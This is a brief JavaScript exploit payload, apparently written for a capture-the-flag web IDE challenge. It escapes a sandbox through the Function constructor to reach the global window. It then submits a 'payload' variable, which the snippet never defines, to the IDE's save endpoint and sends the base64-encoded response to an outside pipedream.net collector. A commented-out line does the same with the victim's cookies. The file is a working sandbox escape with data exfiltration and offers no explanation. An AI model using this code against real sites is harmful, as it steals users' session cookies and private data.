// let window = (_=>0).constructor('return this')();

let window = (_=>0).constructor('return this')();
// window.fetch('https://enali62mm21hu.x.pipedream.net?asd' + window.document.cookie);
let oReq = new window.XMLHttpRequest();
oReq.open('POST', 'https://web-ide.dicec.tf/ide/save');
oReq.send(payload);
window.fetch('https://6d7d010d1165a7ebf6f3094a3b6f443d.m.pipedream.net?as=' + window.btoa(oReq.responseText));
